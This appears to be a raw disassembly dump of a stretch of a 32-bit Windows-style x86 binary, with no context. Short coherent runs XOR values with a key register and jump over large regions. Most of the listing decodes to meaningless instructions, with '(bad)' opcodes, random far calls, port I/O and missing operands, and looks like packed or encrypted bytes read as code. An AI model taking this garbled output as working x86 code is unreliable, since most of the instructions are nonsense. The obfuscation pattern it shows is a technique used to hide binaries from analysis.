  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	fisub  WORD PTR [eax+0xc08e6d6]
  402887:	js     0x402901
  402889:	(bad)  
  40288a:	jle    0x402904
  40288c:	js     0x4028ed
  40288e:	adc    al,0xf0
  402890:	lods   al,BYTE PTR ds:[esi]
  402891:	adc    esi,ebx
  402893:	sahf   
  402894:	test   BYTE PTR [ecx+0x39b01032],bh
  40289a:	enter  0x2bf1,0x59
  40289e:	popa   
  40289f:	ficom  WORD PTR [eax+0x71]
  4028a2:	jmp    FWORD PTR [eax]
  4028a4:	sub    ch,BYTE PTR [edx]
  4028a6:	sbb    eax,0x844ed0c8
  4028ab:	push   ds
  4028ac:	push   0x60
  4028ae:	loop   0x40292c
  4028b0:	lock xchg DWORD PTR [ebp+0x6e63e4d3],eax
  4028b7:	cs stc 
  4028b9:	xchg   esi,eax
  4028ba:	xchg   ebx,eax
  4028bb:	mov    eax,ds:0xe173fd58
  4028c0:	pop    ebp
  4028c1:	mov    cl,0x60
  4028c3:	sbb    cl,BYTE PTR [edi-0x477f82db]
  4028c9:	pop    eax
  4028ca:	aaa    
  4028cb:	lods   al,BYTE PTR ds:[esi]
  4028cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028cd:	xor    al,0xa5
  4028cf:	std    
  4028d0:	jge    0x4028c4
  4028d2:	sbb    DWORD PTR [ecx],esi
  4028d4:	dec    esp
  4028d5:	je     0x4028d4
  4028d7:	out    dx,al
  4028d8:	fcom   st(4)
  4028da:	das    
  4028db:	lods   eax,DWORD PTR ds:[esi]
  4028dc:	(bad)  
  4028dd:	lods   al,BYTE PTR ds:[esi]
  4028de:	in     eax,dx
  4028df:	jnp    0x40289e
  4028e1:	jo     0x40286b
  4028e3:	and    al,0x83
  4028e5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4028e7:	pop    ss
  4028e8:	out    0xcc,eax
  4028ea:	jmp    0x3f61ac2d
  4028ef:	and    DWORD PTR [edi-0x32051a1f],0xffffffba
  4028f6:	test   al,0x9c
  4028f8:	iret   
  4028f9:	mov    BYTE PTR [ebx],cl
  4028fb:	int    0x3c
  4028fd:	shl    ecx,cl
  4028ff:	sbb    al,0x8b
  402901:	mov    BYTE PTR [esi],al
  402903:	rcl    BYTE PTR [eax+0x29c8ed7e],cl
  402909:	fwait
  40290a:	in     eax,0xba
  40290c:	test   DWORD PTR [ebp+0x5c65c43f],ecx
  402912:	hlt    
  402913:	daa    
  402914:	dec    esi
  402915:	and    DWORD PTR [ebp+eax*4-0x2f],ebx
  402919:	jmp    0xb193c504
  40291e:	inc    eax
  40291f:	ficomp WORD PTR [esp+ecx*2]
  402922:	mov    WORD PTR [eax],?
  402924:	pop    esp
  402925:	mov    edx,0xfa2f65f3
  40292a:	aas    
  40292b:	pop    edx
  40292c:	lods   eax,DWORD PTR ds:[esi]
  40292d:	out    0xf4,eax
  40292f:	aaa    
  402930:	pusha  
  402931:	dec    ebp
  402932:	sbb    BYTE PTR [edi-0x12e776b4],0xb0
  402939:	adc    ebx,edi
  40293b:	push   0xffffffab
  40293d:	call   0xa46d9497
  402942:	out    dx,eax
  402943:	lds    edi,FWORD PTR [ebp+0xb]
  402946:	sbb    dh,dh
  402948:	jb     0x4028f3
  40294a:	push   edx
  40294b:	mov    al,ds:0xbbb66720
  402950:	hlt    
  402951:	jmp    DWORD PTR [edi]
  402953:	sub    edi,ebx
  402955:	pusha  
  402956:	fist   DWORD PTR [ecx+0x7380c1fd]
  40295c:	in     eax,dx
  40295d:	jle    0x402900
  40295f:	imul   edx,DWORD PTR [edi],0xdaa1255d
  402965:	push   cs
  402966:	mov    DWORD PTR [ebx-0x7f13232f],ecx
  40296c:	xor    al,0xa8
  40296e:	mov    dl,0x31
  402970:	stc    
  402971:	rol    ah,0x60
  402974:	mov    edx,0x5b91a3d4
  402979:	xchg   ebx,eax
  40297a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40297b:	outs   dx,BYTE PTR ds:[esi]
  40297c:	pop    ebp
  40297d:	xchg   esi,eax
  40297e:	shl    BYTE PTR ds:0xbd7e0a38,0xd9
  402985:	pusha  
  402986:	pop    ss
  402987:	cmp    ebp,DWORD PTR [eax+0x5f]
  40298a:	enter  0x91e7,0xbb
  40298e:	aam    0x23
  402990:	(bad)  
  402991:	aad    0x83
  402993:	or     DWORD PTR [edx-0x1d],eax
  402996:	test   DWORD PTR [edi],edi
  402998:	adc    al,0xc
  40299a:	jne    0x4029bd
  40299c:	(bad)  
  40299e:	sub    eax,0x44cb97b0
  4029a3:	scas   eax,DWORD PTR es:[edi]
  4029a4:	enter  0xa1be,0xf0
  4029a8:	lods   al,BYTE PTR ds:[esi]
  4029a9:	retf   0x4692
  4029ac:	dec    esi
  4029ad:	jmp    0x40296c
  4029af:	fisttp WORD PTR [edx+0x5c8ddc1f]
  4029b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029b6:	sbb    eax,0x80821a00
  4029bb:	test   eax,esp
  4029bd:	xchg   esi,eax
  4029be:	andnps xmm2,XMMWORD PTR [eax]
  4029c1:	mov    ch,0x34
  4029c3:	mov    ecx,0x1c16d31c
  4029c8:	xor    BYTE PTR [edx+0x4d276012],dh
  4029ce:	cli    
  4029cf:	jae    0x402a44
  4029d1:	ss rol bh,1
  4029d4:	ror    DWORD PTR [edx],cl
  4029d6:	into   
  4029d7:	mov    esi,0x381d47c7
  4029dc:	mov    ds:0x7e228b0b,al
  4029e1:	mov    ah,0x86
  4029e3:	inc    DWORD PTR [ecx-0x11]
  4029e6:	jg     0x40298a
  4029e8:	jg     0x402985
  4029ea:	and    ebp,DWORD PTR [edx+0x7e904c46]
  4029f0:	jecxz  0x402998
  4029f2:	leave  
  4029f3:	inc    esi
  4029f4:	fs into 
  4029f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029f7:	rcl    BYTE PTR [ebx],cl
  4029f9:	jae    0x402a13
  4029fb:	push   ss
  4029fc:	mov    bh,0x33
  4029fe:	cmp    BYTE PTR [ebx+0x35ee92ef],dh
  402a04:	lods   al,BYTE PTR ds:[esi]
  402a05:	outs   dx,DWORD PTR ds:[esi]
  402a06:	aas    
  402a07:	arpl   WORD PTR [edi],sp
  402a09:	bound  eax,QWORD PTR [esi+0x6f50f19e]
  402a0f:	loop   0x40299d
  402a11:	das    
  402a12:	mov    cl,0xcc
  402a14:	lds    edi,FWORD PTR [esp+esi*8+0x29dbe918]
  402a1b:	shl    DWORD PTR [esi+eiz*1+0x44b8ad16],1
  402a22:	mov    ch,0xc9
  402a24:	js     0x402a3b
  402a26:	in     eax,dx
  402a27:	das    
  402a28:	jo     0x402a3b
  402a2a:	jns    0x402a8b
  402a2c:	dec    esp
  402a2d:	mov    eax,0x70a9a2b9
  402a32:	add    al,0xd8
  402a34:	aaa    
  402a35:	scas   eax,DWORD PTR es:[edi]
  402a36:	ficom  DWORD PTR [ebx]
  402a38:	dec    edi
  402a39:	retf   0xa89d
  402a3c:	push   edi
  402a3d:	lods   al,BYTE PTR ds:[esi]
  402a3e:	test   esp,0xe19029d
  402a44:	add    ch,BYTE PTR [ecx]
  402a46:	pop    esp
  402a47:	(bad)  
  402a48:	hlt    
  402a49:	sub    DWORD PTR [edi+0x55],ebx
  402a4c:	cwde   
  402a4d:	loopne 0x4029cf
  402a4f:	test   dh,0x12
  402a52:	jne    0x402a3f
  402a54:	ja     0x402a78
  402a56:	inc    ecx
  402a57:	mov    eax,0x58c75da6
  402a5c:	mov    ecx,0x49b678e0
  402a61:	xor    edi,esi
  402a63:	mov    dl,0x25
  402a65:	fadd   QWORD PTR [edi]
  402a67:	call   0x1566:0xb0fea570
  402a6e:	add    ah,BYTE PTR [eax-0x51a56836]
  402a74:	test   al,0x82
  402a76:	jae    0x402ac7
  402a78:	mov    edi,0x90b492f4
  402a7d:	xlat   BYTE PTR ds:[ebx]
  402a7e:	aaa    
  402a7f:	(bad)  
  402a80:	mov    cl,0xcc
  402a82:	dec    ebp
  402a83:	xor    DWORD PTR [ecx+0x2ed3022c],ebp
  402a89:	pop    ecx
  402a8a:	pop    esi
  402a8b:	out    0x52,al
  402a8d:	jae    0x402a81
  402a8f:	mov    bh,0xa
  402a91:	inc    ebp
  402a92:	test   BYTE PTR [esi],cl
  402a94:	jbe    0x402a55
  402a96:	fdiv   QWORD PTR [ecx+0x6a74b2ed]
  402a9c:	jmp    0x402a6e
  402a9e:	push   esi
  402a9f:	jle    0x402a77
  402aa1:	repnz dec edx
  402aa3:	and    BYTE PTR [ebp-0x6e481f65],0x67
  402aaa:	dec    ebx
  402aab:	iret   
  402aac:	jmp    0x1164302a
  402ab1:	ss mov esp,ebp
  402ab4:	bound  edx,QWORD PTR [esi-0x444e8b72]
  402aba:	or     BYTE PTR [esi+0x4e],al
  402abd:	jo     0x402aa8
  402abf:	push   eax
  402ac0:	dec    ebx
  402ac1:	fisubr DWORD PTR [edi+0x5d2bea6]
  402ac7:	in     al,dx
  402ac8:	xchg   DWORD PTR [ebx+0x13e14826],ecx
  402ace:	pop    edx
  402acf:	(bad)  
  402ad0:	ds xor al,0x95
  402ad3:	into   
  402ad4:	add    DWORD PTR [ebx+0x3aba1083],eax
  402ada:	(bad)  
  402adb:	fcomip st,st(1)
  402add:	xchg   ecx,eax
  402ade:	sbb    ah,BYTE PTR ds:0xc231e4ef
  402ae4:	fdiv   st(0),st
  402ae6:	sar    ah,cl
  402ae8:	into   
  402ae9:	arpl   WORD PTR [edx-0x9b22de2],ax
  402aef:	dec    edi
  402af0:	push   ds
  402af1:	pop    ds
  402af2:	rcr    DWORD PTR [esi-0x64414ff4],0xde
  402af9:	add    bl,ah
  402afb:	push   ecx
  402afc:	ins    BYTE PTR es:[edi],dx
  402afd:	xchg   ebx,eax
  402afe:	pop    ss
  402aff:	daa    
  402b00:	test   DWORD PTR [ebp+0x314418bf],0x6acf36c7
  402b0a:	into   
  402b0b:	jae    0x402b13
  402b0d:	jae    0x402b3f
  402b0f:	sub    ecx,eax
  402b11:	jmp    0x402db0
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	inc    edx
  402b23:	mov    esi,DWORD PTR [ebx-0x37]
  402b26:	mov    ss,WORD PTR [edx]
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402afc
  402b2f:	test   eax,0x9fe45bc
  402b34:	(bad)
  402b37:	dec    ecx
  402b38:	out    dx,al
  402b39:	pop    esi
  402b3a:	cmc    
  402b3b:	fadd   QWORD PTR [edi-0x17]
  402b3e:	bound  ecx,QWORD PTR [edx+0x7c5ac81d]
  402b44:	mul    BYTE PTR [ebx]
  402b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b47:	ror    esi,0x12
  402b4a:	call   0x3359:0x182c24e
  402b51:	cs mov esp,esi
  402b54:	pop    ebp
  402b55:	fcmovnu st,st(3)
  402b57:	or     DWORD PTR [ebx],ebp
  402b59:	imul   esp,DWORD PTR [ebx+0x5092fa11],0xf8131f5c
  402b63:	lods   eax,DWORD PTR ds:[esi]
  402b64:	mov    ds:0x44038d1f,eax
  402b69:	test   ch,cl
  402b6b:	mov    ch,0x6d
  402b6d:	(bad)  
  402b6e:	adc    DWORD PTR [eax+0x595d2a4b],ecx
  402b74:	fmul   QWORD PTR [ecx-0x559a9a0d]
  402b7a:	push   edi
  402b7b:	(bad)  
  402b7c:	rcr    DWORD PTR [eax+0x12],1
  402b7f:	pop    edi
  402b80:	loope  0x402b3d
  402b82:	cli    
  402b83:	pop    edi
  402b84:	aam    0xf
  402b86:	daa    
  402b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b88:	fcomp  QWORD PTR [edx+eax*2+0x33e00b80]
  402b8f:	shl    DWORD PTR [eax+0x319cbe],cl
  402b95:	ins    DWORD PTR es:[edi],dx
  402b96:	mov    DWORD PTR [edi+eiz*4],eax
  402b99:	popa   
  402b9a:	add    DWORD PTR ds:0xa7a0039c,ecx
  402ba0:	push   ebx
  402ba1:	xchg   ecx,eax
  402ba2:	leave  
  402ba3:	fcomp  DWORD PTR [esi]
  402ba5:	mov    bh,BYTE PTR [ecx]
  402ba7:	int3   
  402ba8:	stc    
  402ba9:	test   BYTE PTR [edx],0x44
  402bac:	xor    BYTE PTR [eax],bl
  402bae:	(bad)  
  402baf:	(bad)  
  402bb0:	or     BYTE PTR [edi+eiz*1+0x64558574],bh
  402bb7:	loop   0x402be2
  402bb9:	mov    ecx,0xb712065a
  402bbe:	imul   ebp,DWORD PTR [edx],0xef6abd5a
  402bc4:	jns    0x402b89
  402bc6:	and    edx,DWORD PTR [ebx]
  402bc8:	and    al,0xe5
  402bca:	shl    DWORD PTR [ebx],0x76
  402bcd:	or     cl,BYTE PTR [edi+0x6a]
  402bd0:	js     0x402b70
  402bd2:	add    DWORD PTR [ecx+eiz*1-0xfe0a7e1],ecx
  402bd9:	xchg   esp,eax
  402bda:	in     al,0x43
  402bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bdd:	cld    
  402bde:	sub    esp,ecx
  402be0:	adc    dh,al
  402be2:	adc    DWORD PTR [edi],esp
  402be4:	rol    BYTE PTR [ecx],1
  402be6:	jecxz  0x402bb7
  402be8:	adc    al,0xcb
  402bea:	xchg   esi,eax
  402beb:	mov    ah,0x65
  402bed:	daa    
  402bee:	(bad)  
  402bef:	sahf   
  402bf0:	mov    esp,0xd71c0b2a
  402bf5:	jp     0x402ba6
  402bf7:	jae    0x402c0f
  402bf9:	fsub   DWORD PTR [si+0x7857]
  402bfe:	fcomp  DWORD PTR [esi-0x60]
  402c01:	xchg   ebp,eax
  402c02:	repnz push esp
  402c04:	cwde   
  402c05:	ins    DWORD PTR es:[edi],dx
  402c06:	es std 
  402c08:	jb     0x402c2f
  402c0a:	std    
  402c0b:	adc    ch,0xaa
  402c0e:	add    eax,0x8919bc8f
  402c13:	and    al,0x8c
  402c15:	lods   al,BYTE PTR ds:[esi]
  402c16:	mov    ecx,0xd1d0fc84
  402c1b:	retf   0xe47a
  402c1e:	sbb    BYTE PTR [ebx],bl
  402c20:	aas    
  402c21:	push   es
  402c22:	mov    al,al
  402c24:	sbb    ah,ch
  402c26:	add    BYTE PTR [esi-0x6135d5bd],0xa1
  402c2d:	inc    ecx
  402c2e:	mov    eax,0x263ac253
  402c33:	pop    ebp
  402c34:	add    bl,0x30
  402c37:	(bad)
  402c3a:	sub    BYTE PTR [ebp-0x62],al
  402c3d:	mov    cl,0x35
  402c3f:	and    edx,esi
  402c41:	adc    ecx,DWORD PTR [ecx+0x28]
  402c44:	sahf   
  402c45:	or     eax,0x8177f99b
  402c4a:	sbb    BYTE PTR ds:0xf5fd6b00,dh
  402c50:	(bad)
  402c53:	enter  0x9f18,0xe5
  402c57:	add    ecx,ecx
  402c59:	mov    edi,DWORD PTR [ebx-0x3a2692f1]
  402c5f:	in     al,0x89
  402c61:	enter  0xb885,0xde
  402c65:	pushf  
  402c66:	stos   BYTE PTR es:[edi],al
  402c67:	jge    0x402ce4
  402c69:	mov    cl,0x5f
  402c6b:	or     al,0xc1
  402c6d:	aas    
  402c6e:	jle    0x402cb2
  402c70:	sub    dl,BYTE PTR [ecx+0x20]
  402c73:	push   0xabd1f1eb
  402c78:	and    bl,ch
  402c7a:	into   
  402c7b:	dec    dl
  402c7d:	hlt    
  402c7e:	lods   al,BYTE PTR ds:[esi]
  402c7f:	int    0x35
  402c81:	aam    0xbf
  402c83:	add    ah,al
  402c85:	adc    al,BYTE PTR [ebp+0x1a]
  402c88:	imul   esi,DWORD PTR ds:[edx-0x11],0x47
  402c8d:	mov    DWORD PTR [ecx+0x4a],edi
  402c90:	inc    esi
  402c91:	nop
  402c92:	leave  
  402c93:	(bad)  
  402c94:	nop
  402c95:	jecxz  0x402d02
  402c97:	add    al,0xab
  402c99:	lock xor BYTE PTR [edx-0x2a5a8fcc],ah
  402ca0:	icebp  
  402ca1:	sahf   
  402ca2:	add    al,0x63
  402ca4:	xor    BYTE PTR [esi+0x7aa050c4],dl
  402caa:	test   al,0x75
  402cac:	push   0xe4272aee
  402cb1:	xchg   edx,eax
  402cb2:	pop    ebx
  402cb3:	test   eax,0xb50a7e79
  402cb8:	lods   eax,DWORD PTR ds:[esi]
  402cb9:	push   0xffffffac
  402cbb:	popa   
  402cbc:	inc    edx
  402cbd:	daa    
  402cbe:	mov    al,0xb9
  402cc0:	or     al,0x2b
  402cc2:	add    eax,0xdba4124
  402cc7:	mov    ah,cl
  402cc9:	int3   
  402cca:	lds    esi,FWORD PTR ds:0x7b133e93
  402cd0:	popf   
  402cd1:	or     BYTE PTR [ebp-0x55ff0822],0xd4
  402cd8:	leave  
  402cd9:	imul   ebx,DWORD PTR [esi-0x3a],0x73
  402cdd:	inc    eax
  402cde:	stos   DWORD PTR es:[edi],eax
  402cdf:	inc    ecx
  402ce0:	jne    0x402d1a
  402ce2:	enter  0x478c,0xbd
  402ce6:	and    DWORD PTR [edx],edi
  402ce8:	mov    ds:0xc7055902,al
  402ced:	dec    ebx
  402cee:	xor    bl,bh
  402cf0:	scas   al,BYTE PTR es:[edi]
  402cf1:	sub    BYTE PTR [esi-0xe99738e],cl
  402cf7:	in     eax,dx
  402cf8:	in     al,dx
  402cf9:	dec    edx
  402cfa:	sbb    DWORD PTR [ebp+ecx*2+0x45],eax
  402cfe:	jae    0x402c99
  402d00:	int3   
  402d01:	adc    ecx,DWORD PTR [ebx+ebx*1+0x30fe3d88]
  402d08:	xor    al,0x5a
  402d0a:	add    BYTE PTR [ebp-0x7],dl
  402d0d:	sbb    ecx,ebx
  402d0f:	test   ebx,0x2fb9de50
  402d15:	mov    edx,0xaa19899b
  402d1a:	popf   
  402d1b:	cmp    bh,0xc7
  402d1e:	jg     0x402cdb
  402d20:	pop    esi
  402d21:	pop    es
  402d22:	not    BYTE PTR [ecx]
  402d24:	out    0x3d,al
  402d26:	push   cs
  402d27:	out    0x5,al
  402d29:	and    al,0xf3
  402d2b:	sbb    ah,ch
  402d2d:	or     al,0x85
  402d2f:	ins    DWORD PTR es:[edi],dx
  402d30:	cmp    al,0x81
  402d32:	test   edi,esp
  402d34:	(bad)  
  402d35:	xchg   esp,eax
  402d36:	iret   
  402d37:	pop    eax
  402d38:	imul   edx,DWORD PTR [ebx],0x32
  402d3b:	and    al,0x21
  402d3d:	stc    
  402d3e:	shl    DWORD PTR [ecx],0x2a
  402d41:	push   edx
  402d42:	push   ebx
  402d43:	mov    ds:0x77d22115,eax
  402d48:	add    eax,0x196a2a73
  402d4d:	mov    esp,0xa89e78d5
  402d52:	xor    BYTE PTR [edi-0x4e],bh
  402d55:	xchg   ebx,eax
  402d56:	mov    dh,0x5e
  402d58:	xchg   edi,eax
  402d59:	inc    ecx
  402d5a:	bound  esi,QWORD PTR [ebp-0x4cd7ebe2]
  402d60:	adc    eax,0x2876e845
  402d65:	add    BYTE PTR [edi-0x21],dl
  402d68:	ds ret 
  402d6a:	mov    al,ds:0x56b84499
  402d6f:	jnp    0x402de5
  402d71:	out    0x57,al
  402d73:	dec    ebp
  402d74:	lea    esi,ds:[esi-0x6f]
  402d78:	push   ecx
  402d79:	inc    esp
  402d7a:	jl     0x402d63
  402d7c:	and    ah,BYTE PTR [edx-0x6a]
  402d7f:	xor    al,dh
  402d81:	fcom   DWORD PTR [edx+eax*4+0x48]
  402d85:	mov    edx,0xeba1dc87
  402d8a:	push   cs
  402d8b:	sub    DWORD PTR [esi+0x6220e8d4],eax
  402d91:	out    0xac,al
  402d93:	adc    ah,BYTE PTR [ebx-0x76713583]
  402d99:	xor    ecx,DWORD PTR [ebx-0x28e2d8fa]
  402d9f:	test   DWORD PTR ds:0xd43845c8,0x24f8d426
  402da9:	(bad)  
  402daa:	jle    0x402d7a
  402dac:	jg     0x402dd4
  402dae:	repz pop eax
  402db0:	sub    ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	pop    edi
  402df3:	std    
  402df4:	dec    esp
  402df5:	pop    esi
  402df6:	or     al,0x17
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402dfe
  402dff:	jns    0x402db5
  402e01:	js     0x402e5b
  402e03:	and    al,0x92
  402e05:	mov    cl,0x1d
  402e07:	push   esi
  402e08:	call   FWORD PTR [edi-0x9]
  402e0b:	xchg   ecx,eax
  402e0c:	inc    eax
  402e0d:	outs   dx,DWORD PTR ds:[esi]
  402e0e:	(bad)  [ebx+eiz*1+0x4b]
  402e12:	fisub  WORD PTR [esi+0x53]
  402e15:	xor    al,0x15
  402e17:	sbb    BYTE PTR [ebx+0x57],ch
  402e1a:	cmp    BYTE PTR [ebx+esi*4],0x58
  402e1e:	loope  0x402dae
  402e20:	push   edx
  402e21:	sub    eax,0x25180138
  402e26:	pop    ds
  402e27:	jmp    0xe121695c
  402e2c:	clc    
  402e2d:	and    DWORD PTR [esi*8-0x1b474eca],ecx
  402e34:	idiv   BYTE PTR [eax+0xfb9ea12]
  402e3a:	fwait
  402e3b:	stos   DWORD PTR es:[edi],eax
  402e3c:	std    
  402e3d:	cs jmp 0x402e21
  402e40:	dec    ebx
  402e41:	iret   
  402e42:	xor    eax,DWORD PTR [ebx]
  402e44:	pop    ds
  402e45:	push   esp
  402e46:	clc    
  402e47:	sub    bh,BYTE PTR [ebp-0x39354c4b]
  402e4d:	loop   0x402e52
  402e4f:	fild   DWORD PTR [edi+0x6b1a0de6]
  402e55:	hlt    
  402e56:	push   edi
  402e57:	adc    al,0x18
  402e59:	fsubr  DWORD PTR [esi]
  402e5b:	sub    al,0x1
  402e5d:	mov    esp,0x6f2d397a
  402e62:	xchg   esi,eax
  402e63:	mov    ebx,ss
  402e65:	xchg   BYTE PTR [esi-0x33],dh
  402e68:	fwait
  402e69:	pop    esp
  402e6a:	or     esi,DWORD PTR [eax]
  402e6c:	mov    ds:0x84e4989f,al
  402e71:	add    bl,dh
  402e73:	cli    
  402e74:	cld    
  402e75:	push   eax
  402e76:	in     al,0x88
  402e78:	mov    dl,0x87
  402e7a:	rcl    DWORD PTR [esi+0xf],1
  402e7d:	in     al,dx
  402e7e:	sub    al,0x73
  402e80:	test   DWORD PTR [esi-0x10],ecx
  402e83:	popa   
  402e84:	test   BYTE PTR [ebp+0x69a4aca6],ch
  402e8a:	sar    BYTE PTR [ecx-0x3fa49487],cl
  402e90:	cmp    al,0x19
  402e92:	mov    edx,0x92bc06b0
  402e97:	daa    
  402e98:	sbb    eax,0x8807fb59
  402e9d:	inc    ebx
  402e9e:	inc    edx
  402e9f:	pop    esp
  402ea0:	arpl   WORD PTR [edx-0x39],di
  402ea3:	add    al,0x64
  402ea5:	cmp    eax,0x43396f91
  402eab:	adc    esp,DWORD PTR [edx]
  402ead:	mov    eax,ds:0x4f374677
  402eb2:	in     eax,0x8f
  402eb4:	xchg   ecx,eax
  402eb5:	mov    dh,0x52
  402eb7:	lea    edi,ds:0x223a550f
  402ebd:	mov    eax,0x1af626b8
  402ec2:	(bad)  
  402ec3:	clc    
  402ec4:	inc    esp
  402ec5:	inc    edx
  402ec6:	sub    ebp,DWORD PTR [ebx-0x23a65ba2]
  402ecc:	add    al,0xa8
  402ece:	xor    bl,BYTE PTR [ebp-0x25]
  402ed1:	(bad)  [edx]
  402ed3:	pop    ds
  402ed4:	pcmpeqb mm6,QWORD PTR [edx-0x3c18c22b]
  402edb:	inc    ebx
  402edc:	pop    ecx
  402edd:	sti    
  402ede:	push   ecx
  402edf:	sub    eax,0x18f4714e
  402ee4:	cmp    DWORD PTR [edi-0x60958ee0],esp
  402eea:	xor    al,0x4c
  402eec:	jge    0x402f28
  402eee:	cdq    
  402eef:	popf   
  402ef0:	lock in al,0x22
  402ef3:	mov    ds:0xa35bcbae,al
  402ef8:	inc    ebp
  402ef9:	cld    
  402efa:	xchg   ecx,eax
  402efb:	dec    edx
  402efc:	xor    BYTE PTR [edi],ch
  402efe:	call   0xa509e3a9
  402f03:	int3   
  402f04:	das    
  402f05:	mov    al,ds:0xd4577ccb
  402f0a:	test   DWORD PTR [eax-0x5949733f],esp
  402f10:	popa   
  402f11:	pop    ds
  402f12:	xor    DWORD PTR [edx+0x7d],esp
  402f15:	mov    gs,WORD PTR [edx]
  402f17:	and    al,0x21
  402f19:	cld    
  402f1a:	mov    ebx,0xeea20f5f
  402f1f:	xchg   ebx,eax
  402f20:	push   0xffffff93
  402f22:	loopne 0x402eff
  402f24:	mov    eax,?
  402f26:	sub    eax,0xf9de9bc3
  402f2b:	mov    ecx,0xf2fae2ba
  402f30:	xchg   esi,eax
  402f31:	dec    edx
  402f32:	shl    DWORD PTR [ebx],0x4a
  402f35:	xor    ebp,esp
  402f37:	xchg   DWORD PTR [ebx-0x37138fe0],edi
  402f3d:	mov    eax,0x7bd61b2c
  402f42:	pop    ss
  402f43:	ficom  WORD PTR [ebx]
  402f45:	adc    al,0xf0
  402f47:	cmovb  edx,DWORD PTR [esi]
  402f4a:	sti    
  402f4b:	pop    esp
  402f4c:	add    DWORD PTR [ebx+0x5c],eax
  402f4f:	cmp    BYTE PTR [ecx-0x23],0xad
  402f53:	push   ebp
  402f54:	and    eax,0x437f67d7
  402f59:	(bad)  
  402f5a:	xchg   esp,eax
  402f5b:	cdq    
  402f5c:	je     0x402fa2
  402f5e:	rcl    BYTE PTR [ecx+0x40],cl
  402f61:	inc    edi
  402f62:	and    eax,0x290be7d9
  402f67:	fdiv   DWORD PTR [ecx]
  402f69:	iret   
  402f6a:	arpl   WORD PTR [esi],dx
  402f6c:	xchg   edx,eax
  402f6d:	lods   al,BYTE PTR ds:[esi]
  402f6e:	mov    eax,ss
  402f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f71:	mov    esi,0x6caeef4b
  402f76:	xacquire xchg DWORD PTR [eiz*2-0x7bd06335],esi
  402f7e:	xchg   ebx,eax
  402f7f:	ins    BYTE PTR es:[edi],dx
  402f80:	out    0xb9,al
  402f82:	ret    
  402f83:	push   ecx
  402f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f85:	inc    eax
  402f86:	(bad)  
  402f87:	out    dx,al
  402f88:	scas   al,BYTE PTR es:[edi]
  402f89:	sbb    esp,ebx
  402f8b:	aam    0x58
  402f8d:	sub    DWORD PTR [ebp-0x12],ebp
  402f90:	std    
  402f91:	push   edi
  402f92:	jb     0x402f93
  402f94:	sbb    al,0xa7
  402f96:	mov    al,ds:0x42c34940
  402f9b:	xchg   BYTE PTR [eax+0x3fcb5b73],ah
  402fa1:	adc    ecx,DWORD PTR [esi+0x14]
  402fa4:	int3   
  402fa5:	test   eax,0xd0dad5fd
  402faa:	dec    edi
  402fab:	and    eax,0xed74feb0
  402fb0:	xchg   ebx,eax
  402fb1:	dec    ecx
  402fb2:	xchg   esp,eax
  402fb3:	rcr    BYTE PTR [ebx],cl
  402fb5:	pop    ds
  402fb6:	push   0xffffffc1
  402fb8:	pop    esp
  402fb9:	sub    al,0x8
  402fbb:	outs   dx,DWORD PTR ds:[esi]
  402fbc:	hlt    
  402fbd:	je     0x403012
  402fbf:	fsubr  st,st(7)
  402fc1:	xor    eax,0x2af05c61
  402fc6:	arpl   bp,cx
  402fc8:	es jbe 0x402fef
  402fcb:	shr    dh,0xcc
  402fce:	jbe    0x402f57
  402fd0:	mov    ecx,0x33b06207
  402fd5:	in     al,0xb8
  402fd7:	retf   0x7f3c
  402fda:	and    ebx,ebp
  402fdc:	cmp    eax,0x479a8aab
  402fe1:	out    dx,al
  402fe2:	rcr    BYTE PTR [edi],1
  402fe4:	cmp    eax,0xac60b396
  402fe9:	out    0xf1,al
  402feb:	pop    ds
  402fec:	add    eax,0x3f34df9
  402ff1:	sbb    BYTE PTR [edx-0x37101c62],cl
  402ff7:	pop    eax
  402ff8:	in     eax,0x10
  402ffa:	ja     0x403003
  402ffc:	and    BYTE PTR [esi+0x575781c7],dh
  403002:	xchg   edx,eax
  403003:	add    DWORD PTR [ebx+edx*1+0x36384623],ebx
  40300a:	neg    DWORD PTR [ebp+0x14]
  40300d:	mov    WORD PTR [edi-0x2c6d82bb],?
